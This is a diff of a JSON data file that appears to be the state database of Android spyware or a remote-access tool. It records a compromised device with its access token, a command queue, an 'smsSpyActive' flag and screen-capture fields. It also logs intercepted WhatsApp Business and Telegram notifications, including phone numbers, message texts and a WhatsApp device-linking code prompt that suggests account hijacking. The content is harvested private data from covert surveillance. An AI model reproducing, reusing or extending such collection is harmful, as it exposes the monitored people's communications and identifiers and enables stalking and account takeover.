@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775636858333,
+    "lastSeen": 1775636864425,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 15:27",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636866999
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "‎2 pesan baru",
+        "time": "08/04 15:27",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775636860513
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "P",
+        "time": "08/04 15:27",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775636860506
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Key nya di xml mna?",
+        "time": "08/04 15:27",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775636859565
+      },
       {
         "appName": "WA Business",
         "sender": "+62 898-7564-441",
@@ -4294,38 +4326,6 @@
         "time": "08/04 14:33",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633598011
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "taruu di gb ajaaa",
-        "time": "08/04 14:33",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633597947
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Pp",
-        "time": "08/04 14:33",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633597825
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WhatsApp Business",
-        "content": "Masukkan kode untuk menautkan perangkat baru",
-        "time": "08/04 14:32",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633527640
-      },
-      {
-        "appName": "WA Business",
-        "sender": "Menghapus obrolan terpilih…",
-        "content": "49%",
-        "time": "08/04 14:30",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633450272
       }
     ],
     "galleryPhotos": [],
